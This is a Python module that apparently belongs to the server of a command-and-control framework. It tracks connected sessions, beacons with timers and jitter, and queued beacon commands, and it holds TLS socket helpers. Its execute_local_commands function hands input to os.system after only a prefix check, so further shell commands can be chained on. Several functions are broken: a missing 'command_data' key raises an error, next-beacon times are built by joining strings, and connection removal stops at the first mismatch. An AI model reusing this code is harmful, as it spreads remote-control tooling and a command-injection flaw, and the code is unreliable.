"""
Global Objects that are allowed to be accessed anywhere within the project.
This allows for a single form of management with items such as
connected sockets and the ability alter them.

Contains error-handled send and receive functions that
can handle bytes and strings.
"""

import json
from .content_handler import TomlFiles
import struct
from tqdm import tqdm
from typing import Tuple
import ssl
import os
import uuid

# global socket details to allow multiple connections and the ability
# to interact with them individually.
sessions = {
    "uuid": [],
    "address": [],
    "details": [],
    "hostname": [],
    "operating_system": [],
    "mode": [],
}

beacons = {
    "uuid": [],
    "address": [],
    "hostname": [],
    "operating_system": [],
    "last_beacon": [],
    "next_beacon": [],
    "timer": [],
    "jitter": [],
}

beacon_commands = {
    "beacon_uuid": [],
    "command_uuid": [],
    "command": [],
    "command_output": [],
    "executed": [],
}

try:
    with TomlFiles("config.toml") as f:
        config = f
except FileNotFoundError:
    with TomlFiles("src/Server/config.toml") as f:
        config = f


def add_connection_list(conn: ssl.SSLSocket,
                        r_address: Tuple[str, int],
                        host: str,
                        operating_system: str,
                        user_id: str,
                        mode: str) -> None:
    """
    Adds connection details to the global connections dictionary.
    """
    sessions["details"].append(conn)  # the socket connection details
    sessions["address"].append(r_address)  # the IP address and port
    sessions["hostname"].append(host)  # hostname or the socket
    sessions["operating_system"].append(operating_system)
    print(f"User {user_id} connected")
    sessions["uuid"].append(user_id)
    sessions["mode"].append(mode)


def add_beacon_list(uuid: str, r_address: str, hostname: str,
                    operating_system: str, last_beacon, timer,
                    jitter) -> None:
    beacons["uuid"].append(uuid)
    beacons["address"].append(r_address)
    beacons["hostname"].append(hostname)
    beacons["operating_system"].append(operating_system)
    beacons["last_beacon"].append(last_beacon)
    beacons["next_beacon"].append(str(last_beacon) + str(timer))
    beacons["timer"].append(timer)
    beacons["jitter"].append(jitter)


def add_beacon_command_list(beacon_uuid: str,
                            command: str, command_data: json = {}) -> None:
    command_uuid = str(uuid.uuid4())
    beacon_commands["beacon_uuid"].append(beacon_uuid)
    beacon_commands["command_uuid"].append(command_uuid)
    beacon_commands["command"].append(command)
    beacon_commands["command_data"].append(command_data)
    beacon_commands["command_output"].append("Awaiting Response")
    beacon_commands["executed"].append(False)
    print(f"Command {command_uuid} added to beacon {beacon_uuid}")


def remove_connection_list(r_address: Tuple[str, int]) -> None:
    """
    Removes connection from the global connections dictionary.
    """
    for i, item in enumerate(sessions["address"]):
        if item == r_address:
            sessions["details"].pop(i)
            sessions["address"].pop(i)
            sessions["hostname"].pop(i)
            sessions["operating_system"].pop(i)
            sessions["uuid"].pop(i)
            sessions["mode"].pop(i)
        else:
            print("Address not found")
            break


def remove_beacon_list(uuid: str) -> None:
    if uuid in beacons["uuid"]:
        index = beacons["uuid"].index(uuid)
        beacons["uuid"].pop(index)
        beacons["address"].pop(index)
        beacons["hostname"].pop(index)
        beacons["operating_system"].pop(index)
        beacons["last_beacon"].pop(index)
        beacons["next_beacon"].pop(index)
        beacons["timer"].pop(index)
        beacons["jitter"].pop(index)
    else:
        print(f"UUID {uuid} not found in beacons list")


def send_data(conn: ssl.SSLSocket, data: any) -> None:
    """
    Sends data across a socket. The function allows for raw bytes and strings
    to be sent for multiple data types.
    """
    total_length = len(data)  # calculates the total length
    chunk_size = 4096  # sets the chunk size
    conn.sendall(struct.pack('!II', total_length, chunk_size))
    for i in range(0, total_length, chunk_size):
        end_index = min(i + chunk_size, total_length)
        chunk = data[i:end_index]
        try:
            conn.sendall(chunk.encode())
        except AttributeError:
            conn.sendall(chunk)  # if it can't be encoded, sends it as it is.


def receive_data(conn: ssl.SSLSocket) -> str | bytes:
    """
    Receives data from a socket. The function handles receiving both the
    header and the actual data, attempting to decode it as UTF-8 if possible.
    """
    received_data = b''
    try:
        total_length, chunk_size = struct.unpack('!II', conn.recv(8))
        while total_length > 0:
            chunk = conn.recv(min(chunk_size, total_length))
            received_data += chunk
            total_length -= len(chunk)
        try:
            received_data = received_data.decode("utf-8")
        except UnicodeDecodeError:
            pass
    except struct.error:
        pass
    return received_data


def send_data_loadingbar(conn: ssl.SSLSocket, data: any) -> None:
    """
    Sends data across a socket with a loading bar to track progress.
    """
    total_length = len(data)
    chunk_size = 4096
    conn.sendall(struct.pack('!II', total_length, chunk_size))
    for i in tqdm(range(0, total_length, chunk_size),
                  desc="DataSent", colour="#39ff14"):
        end_index = min(i + chunk_size, total_length)
        chunk = data[i:end_index]
        try:
            conn.sendall(chunk.encode())
        except AttributeError:
            conn.sendall(chunk)


def execute_local_commands(value: str) -> bool:
    """
    Executes local commands on the server side.
    """
    if value.lower().startswith(
        ("ls", "cat", "pwd", "ping", "curl", "whoami", "\\", "clear")
    ):
        if value.startswith("\\"):
            value = value.replace("\\", "")
        os.system(value)
        return True
    else:
        return False


def tab_completion(text: str, state: int, variables: list) -> str:
    """
    Allows for tab completion in the config menu.
    """
    options = [var for var in variables if var.startswith(text)]
    return options[state] if state < len(options) else None
